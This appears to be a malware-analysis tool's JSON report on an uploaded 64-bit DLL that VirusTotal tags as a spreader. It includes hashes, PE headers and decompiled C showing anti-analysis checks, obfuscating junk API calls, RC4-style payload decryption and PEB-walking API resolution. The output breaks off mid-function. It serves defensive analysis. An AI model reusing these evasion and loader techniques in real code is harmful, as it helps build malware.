{
  "get_metadata": {
    "path": "G:\\화이트햇스쿨\\Web\\YARRAI_Web\\backend\\uploads\\2c986a81-d3a5-4abe-b11d-58aa8d1bc299.exe",
    "module": "2c986a81-d3a5-4abe-b11d-58aa8d1bc299.exe",
    "base": "0x180000000",
    "size": "0x614000",
    "md5": "fe29ff06620f100ed30f591311d797e1",
    "sha256": "a4ff0e94ef541c0ea4d46229180370817c5383de7f774f9803f551bb5103624f",
    "crc32": "0xb611efbc",
    "filesize": "0x614000"
  },
  "get_current_address": "0x18000198c",
  "get_current_function": "0x18000198c",
  "get_entry_points": [
    {
      "address": "0x18000198c",
      "name": "DllEntryPoint",
      "size": "0xb6"
    }
  ],
  "file_entropy": 7.9899218120822715,
  "string_stats": {
    "string_count": 38378,
    "avg_str_len": 0.0,
    "max_str_len": 0
  },
  "pe_headers": {
    "file_name": "2c986a81-d3a5-4abe-b11d-58aa8d1bc299.exe",
    "machine": "0x8664",
    "number_of_sections": 6,
    "time_date_stamp": "0x683a8894",
    "pointer_to_symbol_table": "0x0",
    "number_of_symbols": 0,
    "size_of_optional_header": 240,
    "characteristics": "0x2023",
    "entry_point": "0x198c",
    "image_base": "0x180000000",
    "section_alignment": "0x1000",
    "file_alignment": "0x1000",
    "subsystem": "0x2",
    "dll_characteristics": "0x0",
    "sections": [
      {
        "name": ".text",
        "virtual_address": "0x1000",
        "virtual_size": "0x3d94",
        "raw_size": "0x4000",
        "characteristics": "0x60000020"
      },
      {
        "name": ".rdata",
        "virtual_address": "0x5000",
        "virtual_size": "0x7b494",
        "raw_size": "0x7c000",
        "characteristics": "0x40000040"
      },
      {
        "name": ".data",
        "virtual_address": "0x81000",
        "virtual_size": "0x1c680",
        "raw_size": "0x1d000",
        "characteristics": "0xc0000040"
      },
      {
        "name": ".pdata",
        "virtual_address": "0x9e000",
        "virtual_size": "0x168",
        "raw_size": "0x1000",
        "characteristics": "0x40000040"
      },
      {
        "name": ".CRT",
        "virtual_address": "0x9f000",
        "virtual_size": "0x57356d",
        "raw_size": "0x574000",
        "characteristics": "0xc0000040"
      },
      {
        "name": ".rsrc",
        "virtual_address": "0x613000",
        "virtual_size": "0x648",
        "raw_size": "0x1000",
        "characteristics": "0x40000040"
      }
    ]
  },
  "virustotal": {
    "sha256": "a4ff0e94ef541c0ea4d46229180370817c5383de7f774f9803f551bb5103624f",
    "type_tag": "pedll",
    "popular_threat_name": null,
    "tags": [
      "pedll",
      "detect-debug-environment",
      "64bits",
      "spreader"
    ]
  },
  "c_code": [
    "#include \"2c986a81-d3a5-4abe-b11d-58aa8d1bc299.h\"",
    "",
    "char __fastcall sub_180001000(char a1, char a2)",
    "{",
    "  dword_18009D650 -= 3799;",
    "  byte_18009D66C = a1 + byte_18009D66E;",
    "  byte_18009D66D = a1;",
    "  byte_18009D66E = a2;",
    "  dword_18009D654 += 6120;",
    "  return 0;",
    "}",
    "",
    "",
    "void *sub_180001051()",
    "{",
    "  return &unk_180081000;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000105E(void *a1, DWORD a2)",
    "{",
    "  while ( WaitForSingleObject(a1, a2) )",
    "    ;",
    "  return 1634833831;",
    "}",
    "",
    "",
    "__int64 sub_180001083()",
    "{",
    "  unsigned int v1; // [rsp+50h] [rbp-164h]",
    "  int v2; // [rsp+58h] [rbp-15Ch]",
    "  int v3; // [rsp+70h] [rbp-144h]",
    "  CHAR v4[4]; // [rsp+94h] [rbp-120h] BYREF",
    "  int v5; // [rsp+98h] [rbp-11Ch]",
    "  char v6; // [rsp+9Ch] [rbp-118h]",
    "",
    "  v3 = 37;",
    "  do",
    "  {",
    "    v2 = v3;",
    "    GetModuleFileNameA(0, v4, 0x104u);",
    "    if ( HIBYTE(v5) == 46 && v6 == 69 && (v5 & 0xFF00FF) == 0x460045 )",
    "      goto LABEL_14;",
    "    ++v3;",
    "  }",
    "  while ( v2 + 1 < 482 );",
    "  GetModuleFileNameA(0, v4, 0x104u);",
    "  if ( v6 == 80 && HIWORD(v5) == 16724 && BYTE1(v5) == 83 )",
    "  {",
    "    sub_18000130B();",
    "    return 2;",
    "  }",
    "  v1 = 0;",
    "  if ( !LoadLibraryExW(\"m\", 0, 1u) )",
    "  {",
    "    if ( GetModuleHandleW(L\"gwf2XwTq.dll\") )",
    "    {",
    "LABEL_14:",
    "      sub_18000130B();",
    "      return 0;",
    "    }",
    "    sub_1800040DC();",
    "    return 1;",
    "  }",
    "  return v1;",
    "}",
    "",
    "",
    "__int64 sub_18000130B()",
    "{",
    "  void *v0; // rsp",
    "  DWORD v1; // eax",
    "  int v2; // eax",
    "  UINT v3; // eax",
    "  LSTATUS v4; // eax",
    "  BOOL v5; // eax",
    "  BOOL v6; // eax",
    "  BOOL v7; // eax",
    "  int ThreadPriority; // eax",
    "  __int64 result; // rax",
    "  _DWORD v10[22]; // [rsp-50h] [rbp-290h] BYREF",
    "  BOOL (__stdcall *v11)(LCID, DWORD); // [rsp+8h] [rbp-238h]",
    "  int v12; // [rsp+14h] [rbp-22Ch]",
    "  DWORD v13; // [rsp+18h] [rbp-228h]",
    "  int v14; // [rsp+1Ch] [rbp-224h]",
    "  int v15; // [rsp+20h] [rbp-220h]",
    "  int v16; // [rsp+24h] [rbp-21Ch]",
    "  DWORD (__stdcall *v17)(HANDLE, DWORD, BOOL); // [rsp+28h] [rbp-218h]",
    "  __int64 v18; // [rsp+30h] [rbp-210h]",
    "  __int64 v19; // [rsp+38h] [rbp-208h]",
    "  BOOL v20; // [rsp+44h] [rbp-1FCh]",
    "  __int64 v21; // [rsp+48h] [rbp-1F8h]",
    "  BOOL v22; // [rsp+54h] [rbp-1ECh]",
    "  __int64 v23; // [rsp+58h] [rbp-1E8h]",
    "  int v24; // [rsp+60h] [rbp-1E0h]",
    "  BOOL v25; // [rsp+64h] [rbp-1DCh]",
    "  BOOL (__stdcall *v26)(HWND, BOOL); // [rsp+68h] [rbp-1D8h]",
    "  __int64 v27; // [rsp+70h] [rbp-1D0h]",
    "  __int64 v28; // [rsp+78h] [rbp-1C8h]",
    "  __int64 v29; // [rsp+80h] [rbp-1C0h]",
    "  __int64 v30; // [rsp+88h] [rbp-1B8h]",
    "  HDC v31; // [rsp+90h] [rbp-1B0h]",
    "  bool v32; // [rsp+9Fh] [rbp-1A1h]",
    "  unsigned __int64 v33; // [rsp+A0h] [rbp-1A0h]",
    "  LPSTR v34; // [rsp+A8h] [rbp-198h]",
    "  BOOL v35; // [rsp+B4h] [rbp-18Ch]",
    "  const CHAR *v36; // [rsp+B8h] [rbp-188h]",
    "  int v37; // [rsp+C0h] [rbp-180h]",
    "  int v38; // [rsp+C4h] [rbp-17Ch]",
    "  const CHAR *v39; // [rsp+C8h] [rbp-178h]",
    "  int v40; // [rsp+D4h] [rbp-16Ch]",
    "  BOOL (__stdcall *v41)(HANDLE, DWORD); // [rsp+D8h] [rbp-168h]",
    "  __int64 v42; // [rsp+E0h] [rbp-160h]",
    "  HDC CompatibleDC; // [rsp+E8h] [rbp-158h]",
    "  __int64 v44; // [rsp+F0h] [rbp-150h]",
    "  HGDIOBJ StockObject; // [rsp+F8h] [rbp-148h]",
    "  int v46; // [rsp+104h] [rbp-13Ch]",
    "  HGDIOBJ (__stdcall *v47)(int); // [rsp+108h] [rbp-138h]",
    "  unsigned __int64 v48; // [rsp+110h] [rbp-130h]",
    "  unsigned __int64 v49; // [rsp+118h] [rbp-128h]",
    "  unsigned __int64 v50; // [rsp+120h] [rbp-120h]",
    "  unsigned __int64 v51; // [rsp+128h] [rbp-118h]",
    "  unsigned __int64 v52; // [rsp+130h] [rbp-110h]",
    "  BOOL v53; // [rsp+13Ch] [rbp-104h]",
    "  __int64 v54; // [rsp+140h] [rbp-100h]",
    "  __int64 v55; // [rsp+148h] [rbp-F8h]",
    "  BOOL StringTypeA; // [rsp+154h] [rbp-ECh]",
    "  int v57; // [rsp+158h] [rbp-E8h]",
    "  LSTATUS v58; // [rsp+15Ch] [rbp-E4h]",
    "  char *v59; // [rsp+160h] [rbp-E0h]",
    "  int v60; // [rsp+168h] [rbp-D8h]",
    "  int v61; // [rsp+16Ch] [rbp-D4h]",
    "  const CHAR *v62; // [rsp+170h] [rbp-D0h]",
    "  UINT v63; // [rsp+17Ch] [rbp-C4h]",
    "  HKEY *v64; // [rsp+180h] [rbp-C0h]",
    "  int v65; // [rsp+188h] [rbp-B8h]",
    "  int v66; // [rsp+18Ch] [rbp-B4h]",
    "  __int64 v67; // [rsp+190h] [rbp-B0h]",
    "  int v68; // [rsp+198h] [rbp-A8h]",
    "  int v69; // [rsp+19Ch] [rbp-A4h]",
    "  RGBQUAD *v70; // [rsp+1A0h] [rbp-A0h]",
    "  int v71; // [rsp+1ACh] [rbp-94h]",
    "  __int64 v72; // [rsp+1B0h] [rbp-90h]",
    "  DWORD v73; // [rsp+1B8h] [rbp-88h]",
    "  int v74; // [rsp+1BCh] [rbp-84h]",
    "  __int64 v75; // [rsp+1C0h] [rbp-80h]",
    "  __int64 v76; // [rsp+1C8h] [rbp-78h]",
    "  __int64 v77; // [rsp+1D0h] [rbp-70h]",
    "  int v78; // [rsp+1DCh] [rbp-64h]",
    "  __int64 v79; // [rsp+1E0h] [rbp-60h]",
    "  _DWORD *v80; // [rsp+1E8h] [rbp-58h]",
    "  LPPAINTSTRUCT v81; // [rsp+1F0h] [rbp-50h]",
    "  __int64 v82; // [rsp+1F8h] [rbp-48h]",
    "  int v83; // [rsp+204h] [rbp-3Ch] BYREF",
    "  HKEY v84; // [rsp+208h] [rbp-38h] BYREF",
    "  RGBQUAD v85; // [rsp+210h] [rbp-30h] BYREF",
    "",
    "  v82 = 0;",
    "  v0 = alloca(80);",
    "  v81 = (LPPAINTSTRUCT)v10;",
    "  v80 = v10;",
    "  v79 = 0;",
    "  do",
    "  {",
    "    v78 = 3742;",
    "    v77 = 11081626;",
    "    v76 = v79;",
    "    v1 = WaitForInputIdle((HANDLE)0xA9179A, 0xE9Eu);",
    "    v75 = 9436268;",
    "    v74 = 3094;",
    "    v73 = v1;",
    "    v2 = SetStretchBltMode((HDC)0x8FFC6C, 3094);",
    "    v72 = 1569552;",
    "    v71 = 1515;",
    "    v70 = &v85;",
    "    v69 = 1065;",
    "    v68 = v2;",
    "    v3 = SetDIBColorTable((HDC)0x17F310, 0x5EBu, 0x429u, &v85);",
    "    v84 = (HKEY)8296066;",
    "    v67 = 2880014;",
    "    v66 = 2351;",
    "    v65 = 1925;",
    "    v64 = &v84;",
    "    v63 = v3;",
    "    v4 = RegOpenUserClassesRoot((HANDLE)0x2BF20E, 0x92Fu, 0x785u, &v84);",
    "    HIWORD(v83) = 35;",
    "    v62 = \"aNB2UY9pd\";",
    "    v61 = 60;",
    "    v60 = 95;",
    "    v59 = (char *)&v83 + 2;",
    "    v58 = v4;",
    "    v57 = 3610;",
    "    StringTypeA = GetStringTypeA(0x3Cu, 0x5Fu, \"aNB2UY9pd\", 3610, (LPWORD)&v83 + 1);",
    "    v55 = 11628496;",
    "    v54 = 3855065;",
    "    v53 = PaintRgn((HDC)0xB16FD0, (HRGN)0x3AD2D9);",
    "    v52 = 0;",
    "    do",
    "    {",
    "      v51 = v52;",
    "      v50 = v52 % 0xF;",
    "      v49 = v52 % 0xF - 8;",
    "      if ( v52 % 0xF != 8 )",
    "      {",
    "        v48 = v50 - 6;",
    "        if ( v50 != 6 )",
    "          goto LABEL_7;",
    "        v47 = GetStockObject;",
    "        v46 = 1506;",
    "        StockObject = GetStockObject(1506);",
    "        v44 = 14112516;",
    "        CompatibleDC = CreateCompatibleDC((HDC)0xD75704);",
    "      }",
    "      v42 = 5783887;",
    "      v41 = SetConsoleMode;",
    "      v40 = 979;",
    "      v5 = SetConsoleMode((HANDLE)0x58414F, 0x3D3u);",
    "      v39 = \"xhaBf+!2*\";",
    "      v38 = 2606;",
    "      v37 = 267;",
    "      v36 = \"HB^b2mWp!\";",
    "      v35 = v5;",
    "      v34 = CharPrevExA(0xA2Eu, \"xhaBf+!2*\", \"HB^b2mWp!\", 0x10Bu);",
    "LABEL_7:",
    "      v33 = v51 + 1;",
    "      v32 = v51 == 860;",
    "      v52 = v51 + 1;",
    "    }",
    "    while ( v51 != 860 );",
    "    v31 = BeginPaint((HWND)0x34AEF3, v81);",
    "    v30 = v76 - 9;",
    "    if ( v76 == 9 )",
    "      goto LABEL_11;",
    "    v29 = v76 - 36;",
    "    if ( v76 == 36 )",
    "    {",
    "      v28 = 4742707;",
    "      v6 = EndPath((HDC)0x485E33);",
    "      v27 = 9904459;",
    "      v26 = EnableWindow;",
    "      v25 = v6;",
    "      v24 = 3226;",
    "      v7 = EnableWindow((HWND)0x97214B, 3226);",
    "      v23 = 743255;",
    "      v22 = v7;",
    "      v21 = 4338463;",
    "      v20 = EndDialog((HWND)0xB5757, 4338463);",
    "LABEL_11:",
    "      v19 = 5791650;",
    "      ThreadPriority = GetThreadPriority((HANDLE)0x585FA2);",
    "      v18 = 3949909;",
    "      v17 = EraseTape;",
    "      v16 = ThreadPriority;",
    "      v15 = 3964;",
    "      v14 = 3487;",
    "      v13 = EraseTape((HANDLE)0x3C4555, 0xD9Fu, 3964);",
    "    }",
    "    v12 = 3961;",
    "    v11 = IsValidLocale;",
    "    v10[21] = 3574;",
    "    v10[20] = IsValidLocale(0xDF6u, 0xF79u);",
    "    result = v76 + 1;",
    "    v79 = v76 + 1;",
    "  }",
    "  while ( v76 != 243 );",
    "  return result;",
    "}",
    "",
    "",
    "// local variable allocation has failed, the output may be wrong!",
    "BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)",
    "{",
    "}void __fastcall sub_180001A42()",
    "{",
    "  __int64 v0; // rbx",
    "  __int64 v1; // rbp",
    "  __int64 v2; // rdi",
    "  __int64 v3; // r13",
    "  __int64 v4; // r15",
    "",
    "  qword_18009D5F8 = v1;",
    "  qword_18009D628 = v3;",
    "  qword_18009D618 = v4;",
    "  qword_18009D640 = v2;",
    "  qword_18009D648 = v0;",
    "  JUMPOUT(0x1800019C9LL);",
    "}",
    "",
    "",
    "// attributes: thunk",
    "LSTATUS __stdcall RegOpenUserClassesRoot(HANDLE hToken, DWORD dwOptions, REGSAM samDesired, PHKEY phkResult)",
    "{",
    "}// attributes: thunk",
    "DWORD __stdcall WaitForInputIdle(HANDLE hProcess, DWORD dwMilliseconds)",
    "{",
    "}// attributes: thunk",
    "LPSTR __stdcall CharPrevExA(WORD CodePage, LPCSTR lpStart, LPCSTR lpCurrentChar, DWORD dwFlags)",
    "{",
    "}// attributes: thunk",
    "HDC __stdcall BeginPaint(HWND hWnd, LPPAINTSTRUCT lpPaint)",
    "{",
    "}// attributes: thunk",
    "BOOL __stdcall EnableWindow(HWND hWnd, BOOL bEnable)",
    "{",
    "}// attributes: thunk",
    "BOOL __stdcall EndDialog(HWND hDlg, INT_PTR nResult)",
    "{",
    "}// attributes: thunk",
    "DWORD __stdcall WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds)",
    "{",
    "}// attributes: thunk",
    "DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize)",
    "{",
    "}// attributes: thunk",
    "HMODULE __stdcall LoadLibraryExW(LPCWSTR lpLibFileName, HANDLE hFile, DWORD dwFlags)",
    "{",
    "}// attributes: thunk",
    "HMODULE __stdcall GetModuleHandleW(LPCWSTR lpModuleName)",
    "{",
    "}// attributes: thunk",
    "BOOL __stdcall GetStringTypeA(LCID Locale, DWORD dwInfoType, LPCSTR lpSrcStr, int cchSrc, LPWORD lpCharType)",
    "{",
    "}// attributes: thunk",
    "BOOL __stdcall SetConsoleMode(HANDLE hConsoleHandle, DWORD dwMode)",
    "{",
    "}// attributes: thunk",
    "int __stdcall GetThreadPriority(HANDLE hThread)",
    "{",
    "}// attributes: thunk",
    "DWORD __stdcall EraseTape(HANDLE hDevice, DWORD dwEraseType, BOOL bImmediate)",
    "{",
    "}// attributes: thunk",
    "BOOL __stdcall IsValidLocale(LCID Locale, DWORD dwFlags)",
    "{",
    "}// attributes: thunk",
    "int __stdcall SetStretchBltMode(HDC hdc, int mode)",
    "{",
    "}// attributes: thunk",
    "UINT __stdcall SetDIBColorTable(HDC hdc, UINT iStart, UINT cEntries, const RGBQUAD *prgbq)",
    "{",
    "}// attributes: thunk",
    "BOOL __stdcall PaintRgn(HDC hdc, HRGN hrgn)",
    "{",
    "}// attributes: thunk",
    "HGDIOBJ __stdcall GetStockObject(int i)",
    "{",
    "}// attributes: thunk",
    "HDC __stdcall CreateCompatibleDC(HDC hdc)",
    "{",
    "}// attributes: thunk",
    "BOOL __stdcall EndPath(HDC hdc)",
    "{",
    "}unsigned __int64 __fastcall _alloca_probe()",
    "{",
    "  unsigned __int64 result; // rax",
    "  char *v1; // r10",
    "  char *StackLimit; // r11",
    "  char v3; // [rsp+18h] [rbp+8h] BYREF",
    "",
    "  v1 = &v3 - result;",
    "  if ( (unsigned __int64)&v3 < result )",
    "    v1 = 0;",
    "  StackLimit = (char *)NtCurrentTeb()->NtTib.StackLimit;",
    "  if ( v1 < StackLimit )",
    "  {",
    "    LOWORD(v1) = (unsigned __int16)v1 & 0xF000;",
    "    do",
    "    {",
    "      StackLimit -= 4096;",
    "      *StackLimit = 0;",
    "    }",
    "    while ( v1 != StackLimit );",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "void  sub_18000339E()",
    "{",
    "  BUG();",
    "}",
    "",
    "",
    "struct _TEB *sub_180003520()",
    "{",
    "  struct _TEB *v0; // rcx",
    "",
    "  dword_18009D650 = 0x1FFF;",
    "  v0 = NtCurrentTeb();",
    "  dword_18009D650 = 6393;",
    "  return v0;",
    "}",
    "",
    "",
    "struct _PEB *sub_180003546()",
    "{",
    "  struct _TEB *v0; // rcx",
    "",
    "  dword_18009D650 = 0x1FFF;",
    "  v0 = NtCurrentTeb();",
    "  dword_18009D650 = dword_18009D654 - 4095;",
    "  return v0->ProcessEnvironmentBlock;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180003575(__int64 a1, __int64 a2, unsigned int a3)",
    "{",
    "  __int64 result; // rax",
    "  int v4; // [rsp+8h] [rbp-48h]",
    "  int v5; // [rsp+Ch] [rbp-44h]",
    "  int v6; // [rsp+14h] [rbp-3Ch]",
    "",
    "  dword_18009D65C = 0;",
    "  byte_18009D660 = 0;",
    "  dword_18009D654 = -4384;",
    "  dword_18009D658 = 0;",
    "  v6 = 0;",
    "  do",
    "  {",
    "    *(_BYTE *)(a1 + v6) = v6;",
    "    v6 = ++dword_18009D658;",
    "  }",
    "  while ( dword_18009D658 < 256 );",
    "  dword_18009D658 = 0;",
    "  v5 = 0;",
    "  v4 = dword_18009D650 + 5510;",
    "  do",
    "  {",
    "    dword_18009D664 = 0;",
    "    dword_18009D650 = v4;",
    "    dword_18009D664 = *(unsigned __int8 *)(a2 + v5 % a3) + dword_18009D65C + *(unsigned __int8 *)(a1 + v5);",
    "    result = (unsigned int)(dword_18009D664 / 256);",
    "    dword_18009D65C = dword_18009D664 % 256;",
    "    byte_18009D660 = *(_BYTE *)(a1 + v5);",
    "    dword_18009D650 = v4 - 6769;",
    "    *(_BYTE *)(a1 + v5) = *(_BYTE *)(a1 + dword_18009D664 % 256);",
    "    dword_18009D650 = 2165;",
    "    *(_BYTE *)(a1 + dword_18009D65C) = byte_18009D660;",
    "    dword_18009D654 = dword_18009D650 - 923;",
    "    dword_18009D650 = 8388;",
    "    v5 = ++dword_18009D658;",
    "    v4 = 13898;",
    "  }",
    "  while ( dword_18009D658 < 256 );",
    "  return result;",
    "}",
    "",
    "",
    "unsigned __int64 __fastcall sub_180003708(unsigned int a1)",
    "{",
    "  unsigned __int64 v1; // rdx",
    "",
    "  dword_18009D650 = 0x1FFF;",
    "  v1 = __readgsqword(a1);",
    "  dword_18009D650 = 6393;",
    "  return v1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000372A(__int64 a1)",
    "{",
    "  __int64 result; // rax",
    "",
    "  dword_18009D654 = 2629;",
    "  result = 0;",
    "  if ( *(_DWORD *)(*(int *)(a1 + 60) + a1) == 17744 )",
    "    return *(int *)(a1 + 60) + a1;",
    "  return result;",
    "}",
    "",
    "",
    "__int16 __fastcall sub_180003762(__int16 a1)",
    "{",
    "  __int16 v2; // [rsp+8h] [rbp-Ch]",
    "  __int16 v3; // [rsp+Ah] [rbp-Ah]",
    "  int v4; // [rsp+Ch] [rbp-8h]",
    "  __int16 v5; // [rsp+12h] [rbp-2h]",
    "",
    "  dword_18009D650 = 7815;",
    "  v5 = a1;",
    "  v4 = 8926;",
    "  v3 = a1;",
    "  if ( (unsigned __int16)(a1 - 65) < 0x1Au )",
    "  {",
    "    while ( 1 )",
    "    {",
    "      v2 = v5;",
    "      if ( v5 == 75 )",
    "        break;",
    "      dword_18009D650 = 1729;",
    "      v4 = 2840;",
    "      v5 += 32;",
    "      v3 = v2 + 32;",
    "      if ( (unsigned __int16)(v2 - 33) >= 0x1Au )",
    "        return v3;",
    "    }",
    "    dword_18009D650 = v4;",
    "    return 107;",
    "  }",
    "  return v3;",
    "}",
    "",
    "",
    "__int64 (__fastcall *sub_180003812())()",
    "{",
    "  __int64 (__fastcall *i)(); // [rsp+18h] [rbp-8h]",
    "",
    "  for ( i = sub_180003812;",
    "        *(_WORD *)i != 23117 || *(_DWORD *)((char *)i + *((int *)i + 15)) != 17744;",
    "        i = (__int64 (__fastcall *)())(((unsigned __int64)i - 4096) & 0xFFFFFFFFFFFFF000uLL) )",
    "  {",
    "    ;",
    "  }",
    "  return i;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000387D(__int64 a1)",
    "{",
    "  unsigned __int64 v2; // [rsp+0h] [rbp-20h]",
    "  unsigned __int64 v3; // [rsp+10h] [rbp-10h]",
    "",
    "  dword_18009D650 -= 5797;",
    "  v3 = (unsigned __int64)sub_180003812;",
    "  if ( a1 )",
    "  {",
    "    dword_18009D654 = 5429;",
    "    return sub_180003B4B(a1, 0);",
    "  }",
    "  else",
    "  {",
    "    while ( 1 )",
    "    {",
    "      if ( *(_WORD *)v3 == 23117 )",
    "      {",
    "        v2 = v3;",
    "        if ( *(_DWORD *)(v3 + *(int *)(v3 + 60)) == 17744 )",
    "          break;",
    "      }",
    "      v3 = (v3 - 4096) & 0xFFFFFFFFFFFFF000uLL;",
    "    }",
    "  }",
    "  return v2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000390E(__int64 a1, __int64 a2, __int64 a3, int a4)",
    "{",
    "  __int64 result; // rax",
    "  __int64 i; // [rsp+Ch] [rbp-58h]",
    "  int v6; // [rsp+14h] [rbp-50h]",
    "  int v7; // [rsp+18h] [rbp-4Ch]",
    "  int v8; // [rsp+1Ch] [rbp-48h]",
    "",
    "  dword_18009D658 = 0;",
    "  dword_18009D65C = 0;",
    "  dword_18009D668 = 0;",
    "  result = (unsigned int)(dword_18009D650 - 3070);",
    "  dword_18009D654 = dword_18009D650 - 3070;",
    "  if ( a4 )",
    "  {",
    "    v8 = dword_18009D650 - 3070;",
    "    v7 = 0;",
    "    v6 = 0;",
    "    for ( i = 0; ; ++i )",
    "    {",
    "      dword_18009D658 = (v7 + 1) % 256;",
    "      dword_18009D650 = v8 - 3550;",
    "      result = (unsigned int)((v6 + *(unsigned __int8 *)(a1 + dword_18009D658)) / 256);",
    "      dword_18009D65C = (v6 + *(unsigned __int8 *)(a1 + dword_18009D658)) % 256;",
    "      dword_18009D650 = v8 - 8298;",
    "      byte_18009D660 = *(_BYTE *)(a1 + dword_18009D658);",
    "      *(_BYTE *)(a1 + dword_18009D658) = *(_BYTE *)(a1 + dword_18009D65C);",
    "      *(_BYTE *)(a1 + dword_18009D65C) = byte_18009D660;",
    "      dword_18009D668 = (unsigned __int8)(*(_BYTE *)(a1 + dword_18009D658) + *(_BYTE *)(a1 + dword_18009D65C));",
    "      dword_18009D654 = dword_18009D650 - 667;",
    "      *(_BYTE *)(a2 + i) = *(_BYTE *)(a1 + (unsigned int)dword_18009D668) ^ *(_BYTE *)(a3 + i);",
    "      dword_18009D650 = 4529;",
    "      if ( (_DWORD)i == a4 - 1 )",
    "        break;",
    "      v7 = dword_18009D658;",
    "      v8 = dword_18009D654;",
    "      v6 = dword_18009D65C;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180003AC2(__int64 a1, __int64 a2, int a3)",
    "{",
    "  _BYTE v7[256]; // [rsp+20h] [rbp-100h] BYREF",
    "",
    "  sub_180003575((__int64)v7, (__int64)&unk_1800050F9, 0x20u);",
    "  dword_18009D650 -= 2510;",
    "  return sub_18000390E((__int64)v7, a1, a2, a3);",
    "}",
    "",
    "",
    "struct _LIST_ENTRY *__fastcall sub_180003B4B(__int64 a1, struct _LIST_ENTRY *a2)",
    "{",
    "  struct _PEB *ProcessEnvironmentBlock; // rax",
    "  struct _LIST_ENTRY *p_InMemoryOrderModuleList; // r8",
    "  struct _LIST_ENTRY *Flink; // rax",
    "  bool v5; // r9",
    "  __int16 v6; // ax",
    "  unsigned __int16 Blink; // dx",
    "  struct _LIST_ENTRY *v8; // r8",
    "  struct _LIST_ENTRY *v9; // rcx",
    "  int v11; // [rsp+0h] [rbp-88h]",
    "  bool v12; // [rsp+7h] [rbp-81h]",
    "  struct _LIST_ENTRY *v13; // [rsp+8h] [rbp-80h]",
    "  struct _LIST_ENTRY *v15; // [rsp+30h] [rbp-58h]",
    "  bool v16; // [rsp+3Fh] [rbp-49h]",
    "  unsigned int v17; // [rsp+40h] [rbp-48h]",
    "  unsigned int v18; // [rsp+48h] [rbp-40h]",
    "  unsigned int v19; // [rsp+4Ch] [rbp-3Ch]",
    "  struct _LIST_ENTRY *v20; // [rsp+68h] [rbp-20h]",
    "",
    "  dword_18009D650 = 0x1FFF;",
    "  ProcessEnvironmentBlock = NtCurrentTeb()->ProcessEnvironmentBlock;",
    "  dword_18009D654 = 7278;",
    "  p_InMemoryOrderModuleList = &ProcessEnvironmentBlock->Ldr->InMemoryOrderModuleList;",
    "  Flink = p_InMemoryOrderModuleList->Flink;",
    "  dword_18009D650 = 1298;",
    "  v20 = p_InMemoryOrderModuleList;",
    "  if ( Flink == p_InMemoryOrderModuleList )",
    "  {",
    "LABEL_15:",
    "    dword_18009D650 = 1021;",
    "    return 0;",
    "  }",
    "  else",
    "  {",
    "    v16 = a2 != 0;",
    "    v15 = Flink;",
    "    while ( 1 )",
    "    {",
    "      dword_18009D650 = 6176;",
    "      if ( v15[2].Flink == a2 && v16 )",
    "      {",
    "        v6 = sub_180003762(84);",
    "        dword_18009D654 = dword_18009D650 + 9801;",
    "        if ( v6 != 49 )",
    "          return v15 - 1;",
    "        dword_18009D650 = 2250;",
    "      }",
    "      Blink = (unsigned __int16)v15[4].Blink;",
    "      dword_18009D654 = 425;",
    "      v8 = v15[5].Flink;",
    "      dword_18009D650 = 8585;",
    "      Blink >>= 1;",
    "      v18 = Blink;",
    "      v13 = v8;",
    "      v17 = 0;",
    "      if ( Blink )",
    "      {",
    "        while ( 1 )",
    "        {",
    "          dword_18009D650 = 6406;",
    "          v19 = v17;",
    "          if ( !*((_WORD *)&v13->Flink + v17) )",
    "            break;",
    "          v5 = *(_WORD *)(a1 + 2LL * v17) == (unsigned __int16)sub_180003762(*((_WORD *)&v13->Flink + v17));",
    "          dword_18009D650 = 7626;",
    "          ++v17;",
    "          if ( v19 + 1 >= v18 || !v5 )",
    "          {",
    "            v11 = v5;",
    "            goto LABEL_12;",
    "          }",
    "        }",
    "        v12 = *(_WORD *)(a1 + 2LL * v17) == 0;",
    "        dword_18009D650 = 4616;",
    "        v11 = v12;",
    "LABEL_12:",
    "        if ( v11 )",
    "          return v15[2].Flink;",
    "      }",
    "      v9 = v15->Flink;",
    "      dword_18009D654 = 4492;",
    "      v15 = v9;",
    "      if ( v9 == v20 )",
    "        goto LABEL_15;",
    "    }",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180003DB7(__int64 a1)",
    "{",
    "  __int64 v1; // rax",
    "  __int64 v2; // r9",
    "  __int64 v3; // r9",
    "  __int64 v4; // r11",
    "  __int64 v5; // r8",
    "  bool v6; // r11",
    "  unsigned int v7; // eax",
    "  _BYTE *v9; // [rsp+6h] [rbp-90h]",
    "  unsigned int v10; // [rsp+12h] [rbp-84h]",
    "  unsigned int v11; // [rsp+16h] [rbp-80h]",
    "  __int64 v12; // [rsp+1Eh] [rbp-78h]",
    "  unsigned int v13; // [rsp+36h] [rbp-60h]",
    "  unsigned int v14; // [rsp+3Ah] [rbp-5Ch]",
    "  unsigned __int16 *v15; // [rsp+3Eh] [rbp-58h]",
    "  int v16; // [rsp+4Ah] [rbp-4Ch]",
    "  __int64 v17; // [rsp+56h] [rbp-40h]",
    "  __int64 v18; // [rsp+66h] [rbp-30h]",
    "  unsigned int v19; // [rsp+72h] [rbp-24h]",
    "  __int64 v20; // [rsp+76h] [rbp-20h]",
    "",
    "  v1 = sub_180004645();",
    "  v2 = 0;",
    "  if ( *(_DWORD *)(*(int *)(v1 + 60) + v1) == 17744 )",
    "    v2 = *(int *)(v1 + 60) + v1;",
    "  dword_18009D654 = 4349;",
    "  v3 = *(unsigned int *)(v2 + 136);",
    "  v4 = *(unsigned int *)(v1 + v3 + 32) + v1;",
    "  dword_18009D650 = 1120;",
    "  v20 = v4;",
    "  v19 = *(_DWORD *)(v1 + v3 + 24);",
    "  v18 = v1;",
    "  v17 = 0;",
    "  if ( v19 )",
    "  {",
    "    v16 = 1120;",
    "    v15 = (unsigned __int16 *)(*(unsigned int *)(v1 + v3 + 36) + v1);",
    "    v14 = 0;",
    "    while ( 1 )",
    "    {",
